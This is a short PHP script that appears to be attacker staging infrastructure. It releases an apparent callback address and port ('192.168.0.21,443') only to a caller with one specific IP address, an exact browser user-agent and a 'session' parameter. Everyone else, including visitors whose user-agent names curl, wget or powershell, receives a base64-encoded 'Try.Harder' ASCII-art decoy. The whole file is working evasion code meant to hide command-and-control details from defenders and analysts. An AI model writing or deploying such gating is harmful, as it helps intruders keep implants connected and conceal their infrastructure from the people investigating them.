<?php
function callerIp($caller) {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    if ($caller === $ip) {
        return TRUE;
    } else {
        return FALSE;
    }
}

function callerAgent($caller) {
    $agent = $_SERVER['HTTP_USER_AGENT'];
    if ($caller === $agent) {
        return TRUE;
    } else {
        return FALSE;
    }
}

function callerParam($caller) {
    $param = isset($_GET[$caller]);
    if ($param) {
        return TRUE;
    } else {
        return FALSE;
    }
}

function decoy() {
    $decoy = 'Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLi4jIy4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLi4uIyMuLi4uLi4uLi4uLg0KLi4uLi4uLiMjLi4uLi4jIy4uLi4jIy4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLiMjLi4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLiMjLi4uLi4uLi4uLi4uLg0KLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4jIyMjIyMjIyMjIyMjIyMjIyMjIy4uLi4uLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uIyMuLi5UcnkuSGFyZGVyLi4uIyMuLiMjLi4uLi4uDQouLi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4jIy4uIyMuLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uLi4jIy4uLi4uLi4uLi4uLiMjLi4uLi4uLi4uLi4uDQouLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjLi4uLi4uLi4NCi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4uLi4uIyMuLi4uLi4uLg0KLi4uLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMuLi4uLi4uLi4uDQouLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4=';
    $agent = $_SERVER['HTTP_USER_AGENT'];
    if(preg_match('((?i)(curl|wget|powershell))', $agent) === 1) {
        echo base64_decode($decoy);
    } else {
        echo '<pre>' . base64_decode($decoy) . '</pre>';
    }
}

function payload() {
    $payload = '192.168.0.21,443';
    echo $payload;
}

$ip = callerIp('192.168.0.29');
$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00');
$param = callerParam('session');

if ($ip && $agent && $param) {
    payload();
} else {
    decoy();
}

?>
